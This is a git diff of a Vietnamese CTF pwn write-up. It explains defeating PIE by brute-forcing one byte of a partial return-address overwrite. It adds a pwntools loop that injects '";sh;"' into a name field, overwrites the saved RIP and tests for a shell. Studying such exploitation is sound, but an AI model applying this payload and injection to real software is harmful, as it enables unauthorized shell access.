@@ -49,9 +49,29 @@ PIE bật tức các địa chỉ binary là ngẫu nhiên.
 
 Ta có thể ghi đè đến saved rip. Tuy nhiên vì PIE nên không thể ghi đè `printff` vào trực tiếp. Tức hiện tại ta sẽ phải brute force 2 BYTES cuối để có khả năng chạy được đến `printff`.
 
-Nhưng sau 1 lúc chạy thì thấy địa chỉ `printff` luôn có BYTE cuối cố định là `a9`
-
 <img width="726" height="27" alt="image" src="https://github.com/user-attachments/assets/9b333506-a6ce-409b-b78c-424d69843182" />
 <img width="726" height="27" alt="image" src="https://github.com/user-attachments/assets/f0683a4d-e99a-479e-b9c0-433c373016c4" />
 
+Nhưng sau 1 lúc chạy thì thấy địa chỉ `printff` luôn có BYTE cuối cố định là `a9`. Có nghĩa chỉ cần chạy brute force đúng 1 BYTE rất nhanh. Bên cạnh đó, vì BYTE 
+`a9` là cố định nên các địa chỉ sau cũng tương tự có BYTE cuối cố định. Lấy địa chỉ sau đó 5 BYTES để tránh stack không chia hết cho 16.
 
+
+        while(1):
+             ...
+                p.sendlineafter(b'Your Name is:',b'";sh;"')    //đưa sh vào system
+                
+                payload=b'A'*32
+                payload+=p64(0)
+                payload+=b'\xae'+b'\x12'                        //ghi đè 
+                p.sendafter(b'Feedback for the game:',payload)   
+                p.recvuntil(b'Thanks for your feedback!')
+
+                try:
+		        p.sendline(b'echo ABCD')
+		        p.recvuntil(b'ABCD')
+		break
+	        except:
+		        try:
+			p.close()
+		except:
+			pass
